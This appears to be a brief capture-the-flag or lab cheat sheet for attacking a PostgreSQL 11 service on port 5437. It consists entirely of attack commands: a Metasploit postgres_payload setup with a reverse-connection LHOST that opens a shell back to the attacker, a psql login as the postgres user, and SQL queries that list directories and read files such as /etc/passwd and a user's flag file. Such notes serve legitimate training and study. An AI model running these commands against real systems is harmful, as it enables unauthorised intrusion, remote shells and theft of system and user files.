# Commands
### Exploitation via Metasploit:
`5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.7`
```bash
use exploit(linux/postgres/postgres_payload)
set RHOST <target-ip>
set RPORT 5437
set LHOST tun0
run
```
### Manual Access via psql:
```bash
psql -U postgres -p 5437 -h <target-ip>
```

###
```bash
SELECT pg_ls_dir('./');
SELECT pg_ls_dir('/etc/passwd');
SELECT pg_ls_dir('/home/wilson');
SELECT pg_read_file('/home/wilson/local.txt');
```

